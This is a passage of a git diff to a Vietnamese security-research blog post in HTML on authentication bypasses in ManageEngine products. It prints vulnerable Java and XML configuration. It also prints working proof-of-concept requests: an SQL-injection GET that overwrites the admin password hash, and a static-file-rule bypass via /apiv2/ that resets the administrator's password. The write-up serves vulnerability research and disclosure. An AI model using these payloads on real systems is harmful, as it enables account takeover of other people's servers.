+</span></span><span style="display:flex;"><span>    String updColum <span style="color:#f92672">=</span> req<span style="color:#f92672">.</span><span style="color:#a6e22e">getRequiredParam</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;COLUMN&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>    String updColumValue <span style="color:#f92672">=</span> req<span style="color:#f92672">.</span><span style="color:#a6e22e">getRequiredParam</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;VALUE&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>    String table <span style="color:#f92672">=</span> req<span style="color:#f92672">.</span><span style="color:#a6e22e">getRequiredParam</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;TABLE&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>    ZAConnConsumerUtil<span style="color:#f92672">.</span><span style="color:#a6e22e">updateTableValue</span><span style="color:#f92672">(</span>table<span style="color:#f92672">,</span> updColum<span style="color:#f92672">,</span> updColumValue<span style="color:#f92672">,</span> connInfoId<span style="color:#f92672">,</span> connModId<span style="color:#f92672">,</span> connEntityId<span style="color:#f92672">);</span> <span style="color:#75715e">// [1]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    response<span style="color:#f92672">.</span><span style="color:#a6e22e">put</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;message&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;Restored Successfully&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>    JSONObject connPerms <span style="color:#f92672">=</span> response<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> connPerms<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>Tại [1] sẽ gọi tới <code>ZAConnConsumerUtil.updateTableValue()</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">updateTableValue</span><span style="color:#f92672">(</span>String tableName<span style="color:#f92672">,</span> String columnName<span style="color:#f92672">,</span> String columnValue<span style="color:#f92672">,</span> Long connInfoId<span style="color:#f92672">,</span> Long connModId<span style="color:#f92672">,</span> Long connEntitiyId<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> Exception <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    String sql <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">switch</span> <span style="color:#f92672">(</span>tableName<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#34;CustomConnectorInfo&#34;</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>            sql <span style="color:#f92672">=</span> SQLQueryAPI<span style="color:#f92672">.</span><span style="color:#a6e22e">getSQLString</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;ZAUpdateTableColValueForConnInfo&#34;</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[][]{{</span><span style="color:#e6db74">&#34;UPDATECOLUMN&#34;</span><span style="color:#f92672">,</span> columnName<span style="color:#f92672">},</span> <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;UPDATEDVALUE&#34;</span><span style="color:#f92672">,</span> columnValue<span style="color:#f92672">},</span> <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;CONNINFOID&#34;</span><span style="color:#f92672">,</span> connInfoId<span style="color:#f92672">}});</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#34;CustomConnectorModuleInfo&#34;</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>            sql <span style="color:#f92672">=</span> SQLQueryAPI<span style="color:#f92672">.</span><span style="color:#a6e22e">getSQLString</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;ZAUpdateTableColValueForConnModInfo&#34;</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[][]{{</span><span style="color:#e6db74">&#34;UPDATECOLUMN&#34;</span><span style="color:#f92672">,</span> columnName<span style="color:#f92672">},</span> <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;UPDATEDVALUE&#34;</span><span style="color:#f92672">,</span> columnValue<span style="color:#f92672">},</span> <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;CONNINFOID&#34;</span><span style="color:#f92672">,</span> connInfoId<span style="color:#f92672">},</span> <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;CONNMODID&#34;</span><span style="color:#f92672">,</span> connModId<span style="color:#f92672">}});</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#34;CustomConnectorEntityInfo&#34;</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>            sql <span style="color:#f92672">=</span> SQLQueryAPI<span style="color:#f92672">.</span><span style="color:#a6e22e">getSQLString</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;ZAUpdateTableColValueForConnEntityInfo&#34;</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[][]{{</span><span style="color:#e6db74">&#34;UPDATECOLUMN&#34;</span><span style="color:#f92672">,</span> columnName<span style="color:#f92672">},</span> <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;UPDATEDVALUE&#34;</span><span style="color:#f92672">,</span> columnValue<span style="color:#f92672">},</span> <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;CONNINFOID&#34;</span><span style="color:#f92672">,</span> connInfoId<span style="color:#f92672">},</span> <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;CONNENTITYID&#34;</span><span style="color:#f92672">,</span> connEntitiyId<span style="color:#f92672">}});</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#34;CustomConnectorModuleStatus&#34;</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>            sql <span style="color:#f92672">=</span> SQLQueryAPI<span style="color:#f92672">.</span><span style="color:#a6e22e">getSQLString</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;ZAUpdateTableColValueForModuleStatus&#34;</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[][]{{</span><span style="color:#e6db74">&#34;UPDATECOLUMN&#34;</span><span style="color:#f92672">,</span> columnName<span style="color:#f92672">},</span> <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;UPDATEDVALUE&#34;</span><span style="color:#f92672">,</span> columnValue<span style="color:#f92672">},</span> <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;CONNMODID&#34;</span><span style="color:#f92672">,</span> connModId<span style="color:#f92672">},</span> <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;CONNENTITYID&#34;</span><span style="color:#f92672">,</span> connEntitiyId<span style="color:#f92672">}});</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>sql <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        SQLQueryAPI<span style="color:#f92672">.</span><span style="color:#a6e22e">executeUpdate</span><span style="color:#f92672">(</span>sql<span style="color:#f92672">,</span> <span style="color:#66d9ef">new</span> RptSQLAdapter<span style="color:#f92672">(</span>connInfoId <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">?</span> connInfoId <span style="color:#f92672">:</span> connModId<span style="color:#f92672">));</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p><code>SQLQueryAPI.getSQLString()</code> có nhiệm vụ lấy <code>sqlString</code> được định nghĩa sẵn trong file cấu hình xml, sau đó thay thế các template variable để tạo thành câu SQL hoàn chỉnh:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;sql</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;ZAUpdateTableColValueForConnInfo&#34;</span><span style="color:#f92672">&gt;</span> <span style="color:#75715e">&lt;![CDATA[
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">    update CustomConnectorInfo set ${UPDATECOLUMN:STRING}= &#39;${UPDATEDVALUE:STRING}&#39; where CONNINFOID = ${CONNINFOID:LONG}
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">]]&gt;</span> <span style="color:#f92672">&lt;/sql&gt;</span>
@@ -371,7 +371,7 @@ results.stream().toArray();
 <li><code>user_auto_id=8:</code> id của admin account</li>
 </ul>
 <p>Vì dấu nháy sẽ bị escape, payload cần tránh dùng ký tự này. Ở đây có khá nhiều cách để xử lý, nhưng đơn giản nhất với mình vẫn là dùng function <code>chr()</code> để convert giá trị ASCII thành ký tự rồi nối lại thành string cho đoạn bcrypt hash. Full payload:</p>
-<pre tabindex="0"><code class="language-!" data-lang="!">GET /connectoradmin/action/UPDATECONNECTORMETA/conndbinfoid/202/a.png?COLUMN=&lt;@urlencode&gt;VERSIONNO=1 where 1=0; update iamuserpassword set password=chr(36)||chr(50)||chr(97)||chr(36)||chr(49)||chr(48)||chr(36)||chr(53)||chr(103)||chr(122)||chr(97)||chr(114)||chr(67)||chr(115)||chr(66)||chr(51)||chr(79)||chr(108)||chr(74)||chr(76)||chr(71)||chr(115)||chr(88)||chr(83)||chr(86)||chr(97)||chr(117)||chr(80)||chr(46)||chr(122)||chr(48)||chr(122)||chr(97)||chr(72)||chr(51)||chr(68)||chr(72)||chr(47)||chr(67)||chr(106)||chr(77)||chr(108)||chr(118)||chr(46)||chr(121)||chr(98)||chr(86)||chr(54)||chr(104)||chr(80)||chr(107)||chr(103)||chr(67)||chr(88)||chr(97)||chr(78)||chr(54)||chr(71)||chr(106)||chr(46) where user_auto_id=8;--&lt;/@urlencode&gt;&amp;VALUE=test2&amp;TABLE=CustomConnectorInfo HTTP/1.1
+<pre tabindex="0"><code>GET /connectoradmin/action/UPDATECONNECTORMETA/conndbinfoid/202/a.png?COLUMN=&lt;@urlencode&gt;VERSIONNO=1 where 1=0; update iamuserpassword set password=chr(36)||chr(50)||chr(97)||chr(36)||chr(49)||chr(48)||chr(36)||chr(53)||chr(103)||chr(122)||chr(97)||chr(114)||chr(67)||chr(115)||chr(66)||chr(51)||chr(79)||chr(108)||chr(74)||chr(76)||chr(71)||chr(115)||chr(88)||chr(83)||chr(86)||chr(97)||chr(117)||chr(80)||chr(46)||chr(122)||chr(48)||chr(122)||chr(97)||chr(72)||chr(51)||chr(68)||chr(72)||chr(47)||chr(67)||chr(106)||chr(77)||chr(108)||chr(118)||chr(46)||chr(121)||chr(98)||chr(86)||chr(54)||chr(104)||chr(80)||chr(107)||chr(103)||chr(67)||chr(88)||chr(97)||chr(78)||chr(54)||chr(71)||chr(106)||chr(46) where user_auto_id=8;--&lt;/@urlencode&gt;&amp;VALUE=test2&amp;TABLE=CustomConnectorInfo HTTP/1.1
 Host: &lt;host&gt;
 </code></pre><ul>
 <li><code>@urlencode</code> tag: phần cần url encode</li>
@@ -402,20 +402,20 @@ Host: &lt;host&gt;
 </span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/auth-constraint&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/security-constraint&gt;</span>
 </span></span></code></pre></div><p>Chỉ một số url là được whitelist không cần xác thực:</p>
-<pre tabindex="0"><code class="language-xml!" data-lang="xml!">&lt;security-constraint&gt;
-	&lt;web-resource-collection&gt;
-		&lt;web-resource-name&gt;Secured Core Context&lt;/web-resource-name&gt;
-		&lt;!-- For static files URLs --&gt;
-		&lt;url-pattern&gt;/scripts/*&lt;/url-pattern&gt;
-		&lt;url-pattern&gt;/images/*&lt;/url-pattern&gt;
-		&lt;url-pattern&gt;/favicon.ico&lt;/url-pattern&gt;
-		&lt;url-pattern&gt;/fonts/*&lt;/url-pattern&gt;
-		&lt;url-pattern&gt;/zohocomponents/*&lt;/url-pattern&gt;
-
-		&lt;!-- truncated... --&gt;
-	&lt;/web-resource-collection&gt;
-&lt;/security-constraint&gt;
-</code></pre><p>Anyway, tương tự với Analytics Plus, ta có thể lợi dụng các rule trên để match với bất kỳ servlet nào có wildcard mapping. Tránh rơi vào ActionRule yêu cầu role cao.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;security-constraint&gt;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">&lt;web-resource-collection&gt;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#f92672">&lt;web-resource-name&gt;</span>Secured Core Context<span style="color:#f92672">&lt;/web-resource-name&gt;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">&lt;!-- For static files URLs --&gt;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#f92672">&lt;url-pattern&gt;</span>/scripts/*<span style="color:#f92672">&lt;/url-pattern&gt;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#f92672">&lt;url-pattern&gt;</span>/images/*<span style="color:#f92672">&lt;/url-pattern&gt;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#f92672">&lt;url-pattern&gt;</span>/favicon.ico<span style="color:#f92672">&lt;/url-pattern&gt;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#f92672">&lt;url-pattern&gt;</span>/fonts/*<span style="color:#f92672">&lt;/url-pattern&gt;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#f92672">&lt;url-pattern&gt;</span>/zohocomponents/*<span style="color:#f92672">&lt;/url-pattern&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">&lt;!-- truncated... --&gt;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">&lt;/web-resource-collection&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/security-constraint&gt;</span>
+</span></span></code></pre></div><p>Anyway, tương tự với Analytics Plus, ta có thể lợi dụng các rule trên để match với bất kỳ servlet nào có wildcard mapping. Tránh rơi vào ActionRule yêu cầu role cao.</p>
 <p>Tuy nhiên như đã đề cập, request khi match các rule này không được chứa param nào, nên ta chỉ có thể kiểm soát requestURI, một hạn chế khá lớn.</p>
 <p>Vì mọi request cần được khai báo dưới dạng ActionRule, có thể lấy toàn bộ định dạng request bằng cách search theo regex sau:
 <img src="/images/2026/Auth-Bypass-Across-ManageEngine-Products/search_regex_url.png" alt="search_regex_url"></p>
@@ -426,26 +426,26 @@ Host: &lt;host&gt;
 <p>Dù vậy mình vẫn tìm ra 2 cách để bypass giới hạn này.</p>
 <h3 id="case-1-bypass-using-other-mapping">Case 1: Bypass using other mapping</h3>
 <p><code>web.xml</code> map <code>/api/v3/</code> với class <code>SDPAPIV2Servlet</code>:</p>
-<pre tabindex="0"><code class="language-xml!" data-lang="xml!">&lt;servlet&gt;
-    &lt;servlet-name&gt;api/v3&lt;/servlet-name&gt;
-    &lt;servlet-class&gt;com.manageengine.servicedesk.sdpapi.v2.servlet.SDPAPIV2Servlet&lt;/servlet-class&gt;
-&lt;/servlet&gt;
-
-&lt;servlet-mapping&gt;
-    &lt;servlet-name&gt;api/v3&lt;/servlet-name&gt;
-    &lt;url-pattern&gt;/api/v3/*&lt;/url-pattern&gt;
-&lt;/servlet-mapping&gt;
-</code></pre><p>Mình tìm được một mapping khác cũng map vào class trên nhưng dùng <code>/apiv2/</code>:</p>
-<pre tabindex="0"><code class="language-xml!" data-lang="xml!">&lt;servlet&gt;
-    &lt;servlet-name&gt;apiv2&lt;/servlet-name&gt;
-    &lt;servlet-class&gt;com.manageengine.servicedesk.sdpapi.v2.servlet.SDPAPIV2Servlet&lt;/servlet-class&gt;
-&lt;/servlet&gt;
-
-&lt;servlet-mapping&gt;
-    &lt;servlet-name&gt;apiv2&lt;/servlet-name&gt;
-    &lt;url-pattern&gt;/apiv2/*&lt;/url-pattern&gt;
-&lt;/servlet-mapping&gt;
-</code></pre><p>Thông thường, do không có ActionRule nào cho <code>/apiv2/*</code>, path này dù nằm trong mapping cũng không thể dùng được. Nhưng nếu kết hợp với 2 rule static files trên, ta có thể khiến request match vào rule static files để truy cập <code>SDPAPIV2Servlet</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;servlet&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;servlet-name&gt;</span>api/v3<span style="color:#f92672">&lt;/servlet-name&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;servlet-class&gt;</span>com.manageengine.servicedesk.sdpapi.v2.servlet.SDPAPIV2Servlet<span style="color:#f92672">&lt;/servlet-class&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/servlet&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;servlet-mapping&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;servlet-name&gt;</span>api/v3<span style="color:#f92672">&lt;/servlet-name&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;url-pattern&gt;</span>/api/v3/*<span style="color:#f92672">&lt;/url-pattern&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/servlet-mapping&gt;</span>
+</span></span></code></pre></div><p>Mình tìm được một mapping khác cũng map vào class trên nhưng dùng <code>/apiv2/</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;servlet&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;servlet-name&gt;</span>apiv2<span style="color:#f92672">&lt;/servlet-name&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;servlet-class&gt;</span>com.manageengine.servicedesk.sdpapi.v2.servlet.SDPAPIV2Servlet<span style="color:#f92672">&lt;/servlet-class&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/servlet&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;servlet-mapping&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;servlet-name&gt;</span>apiv2<span style="color:#f92672">&lt;/servlet-name&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;url-pattern&gt;</span>/apiv2/*<span style="color:#f92672">&lt;/url-pattern&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/servlet-mapping&gt;</span>
+</span></span></code></pre></div><p>Thông thường, do không có ActionRule nào cho <code>/apiv2/*</code>, path này dù nằm trong mapping cũng không thể dùng được. Nhưng nếu kết hợp với 2 rule static files trên, ta có thể khiến request match vào rule static files để truy cập <code>SDPAPIV2Servlet</code>.</p>
 <p>PoC request reset password account có <code>id=2</code>, chính là <code>administrator</code>:</p>
 <pre tabindex="0"><code>GET /apiv2/orgusers/2/reset_password/a.woff HTTP/1.1
 Host: &lt;host&gt;
@@ -457,48 +457,48 @@ Cookie: &lt;truncated&gt;
 <p>Trong trường hợp không có mapping <code>/apiv2/*</code>, vẫn còn một cách khác là lợi dụng <code>StateFilter</code>.</p>
 <h3 id="case-2-bypass-via-url-forwarding">Case 2: Bypass via url forwarding</h3>
 <p>Request có prefix <code>/STATE_ID/*</code> sẽ đi qua <code>StateFilter</code>:</p>
-<pre tabindex="0"><code class="language-xml!" data-lang="xml!">&lt;filter&gt;
-    &lt;filter-name&gt;StateFilter&lt;/filter-name&gt;
-    &lt;filter-class&gt;com.adventnet.client.view.web.StateFilter&lt;/filter-class&gt;
-&lt;/filter&gt;
-
-&lt;filter-mapping&gt;
-    &lt;filter-name&gt;StateFilter&lt;/filter-name&gt;
-    &lt;url-pattern&gt;/STATE_ID/*&lt;/url-pattern&gt;
-&lt;/filter-mapping&gt;
-</code></pre><p>Class <code>StateFilter</code>:</p>
-<pre tabindex="0"><code class="language-java!" data-lang="java!">public class StateFilter implements Filter, WebConstants {
-        public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
-        try {
-            StateParserGenerator.processState((HttpServletRequest)request, (HttpServletResponse)response); // [1]
-            String forwardPath = ((HttpServletRequest)request).getRequestURI();
-            if (WebClientUtil.isRestful((HttpServletRequest)request) &amp;&amp; forwardPath.indexOf(&#34;STATE_ID&#34;) == -1) {
-                chain.doFilter(request, response);
-            } else {
-                String path = this.getForwardPath((HttpServletRequest)request); // [2]
-                RequestDispatcher rd = request.getRequestDispatcher(path);
-                rd.forward(request, response); // [3]
-            }
-        // truncated
-    }
-
-    private String getForwardPath(HttpServletRequest request) {
-        String path = request.getContextPath() + &#34;/STATE_ID/&#34;;
-        String forwardPath = request.getRequestURI();
-        if (!forwardPath.startsWith(path)) {
-            return forwardPath;
-        } else {
-            int index = forwardPath.indexOf(47, path.length());
-            if (WebClientUtil.isRestful(request)) {
-                forwardPath = forwardPath.substring(path.length() - 1);
-            } else if (index &gt; 0) {
-                forwardPath = forwardPath.substring(index);
-            }
-
-            return forwardPath;
-    }
-}
-</code></pre><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;filter&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;filter-name&gt;</span>StateFilter<span style="color:#f92672">&lt;/filter-name&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;filter-class&gt;</span>com.adventnet.client.view.web.StateFilter<span style="color:#f92672">&lt;/filter-class&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/filter&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;filter-mapping&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;filter-name&gt;</span>StateFilter<span style="color:#f92672">&lt;/filter-name&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;url-pattern&gt;</span>/STATE_ID/*<span style="color:#f92672">&lt;/url-pattern&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/filter-mapping&gt;</span>
+</span></span></code></pre></div><p>Class <code>StateFilter</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">StateFilter</span> <span style="color:#66d9ef">implements</span> Filter<span style="color:#f92672">,</span> WebConstants <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">doFilter</span><span style="color:#f92672">(</span>ServletRequest request<span style="color:#f92672">,</span> ServletResponse response<span style="color:#f92672">,</span> FilterChain chain<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> IOException<span style="color:#f92672">,</span> ServletException <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            StateParserGenerator<span style="color:#f92672">.</span><span style="color:#a6e22e">processState</span><span style="color:#f92672">((</span>HttpServletRequest<span style="color:#f92672">)</span>request<span style="color:#f92672">,</span> <span style="color:#f92672">(</span>HttpServletResponse<span style="color:#f92672">)</span>response<span style="color:#f92672">);</span> <span style="color:#75715e">// [1]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            String forwardPath <span style="color:#f92672">=</span> <span style="color:#f92672">((</span>HttpServletRequest<span style="color:#f92672">)</span>request<span style="color:#f92672">).</span><span style="color:#a6e22e">getRequestURI</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>WebClientUtil<span style="color:#f92672">.</span><span style="color:#a6e22e">isRestful</span><span style="color:#f92672">((</span>HttpServletRequest<span style="color:#f92672">)</span>request<span style="color:#f92672">)</span> <span style="color:#f92672">&amp;&amp;</span> forwardPath<span style="color:#f92672">.</span><span style="color:#a6e22e">indexOf</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;STATE_ID&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                chain<span style="color:#f92672">.</span><span style="color:#a6e22e">doFilter</span><span style="color:#f92672">(</span>request<span style="color:#f92672">,</span> response<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                String path <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getForwardPath</span><span style="color:#f92672">((</span>HttpServletRequest<span style="color:#f92672">)</span>request<span style="color:#f92672">);</span> <span style="color:#75715e">// [2]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                RequestDispatcher rd <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span><span style="color:#a6e22e">getRequestDispatcher</span><span style="color:#f92672">(</span>path<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>                rd<span style="color:#f92672">.</span><span style="color:#a6e22e">forward</span><span style="color:#f92672">(</span>request<span style="color:#f92672">,</span> response<span style="color:#f92672">);</span> <span style="color:#75715e">// [3]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// truncated
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> String <span style="color:#a6e22e">getForwardPath</span><span style="color:#f92672">(</span>HttpServletRequest request<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        String path <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span><span style="color:#a6e22e">getContextPath</span><span style="color:#f92672">()</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/STATE_ID/&#34;</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>        String forwardPath <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span><span style="color:#a6e22e">getRequestURI</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(!</span>forwardPath<span style="color:#f92672">.</span><span style="color:#a6e22e">startsWith</span><span style="color:#f92672">(</span>path<span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> forwardPath<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">int</span> index <span style="color:#f92672">=</span> forwardPath<span style="color:#f92672">.</span><span style="color:#a6e22e">indexOf</span><span style="color:#f92672">(</span><span style="color:#ae81ff">47</span><span style="color:#f92672">,</span> path<span style="color:#f92672">.</span><span style="color:#a6e22e">length</span><span style="color:#f92672">());</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>WebClientUtil<span style="color:#f92672">.</span><span style="color:#a6e22e">isRestful</span><span style="color:#f92672">(</span>request<span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
